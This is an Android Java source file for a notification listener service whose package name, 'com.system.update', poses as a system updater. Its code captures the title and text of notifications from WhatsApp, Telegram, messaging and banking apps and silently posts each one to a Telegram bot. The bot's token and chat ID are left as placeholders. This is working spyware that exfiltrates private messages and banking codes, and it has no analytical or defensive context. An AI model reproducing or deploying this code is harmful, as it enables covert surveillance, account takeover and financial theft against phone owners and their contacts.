package com.system.update;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import java.io.IOException;
import okhttp3.*;

public class NotificationService extends NotificationListenerService {
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
    private static final String CHAT_ID = "YOUR_CHAT_ID";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        if (packageName.contains("whatsapp") || packageName.contains("telegram") || packageName.contains("messaging") || packageName.contains("bank")) {
            String title = sbn.getNotification().extras.getString("android.title");
            String text = sbn.getNotification().extras.getString("android.text");
            if (text != null) send("🔔 [" + packageName + "]\n" + title + ": " + text);
        }
    }
    private void send(String msg) {
        RequestBody body = new FormBody.Builder().add("chat_id", CHAT_ID).add("text", msg).build();
        Request request = new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { }
            @Override public void onResponse(Call call, Response response) { }
        });
    }
}
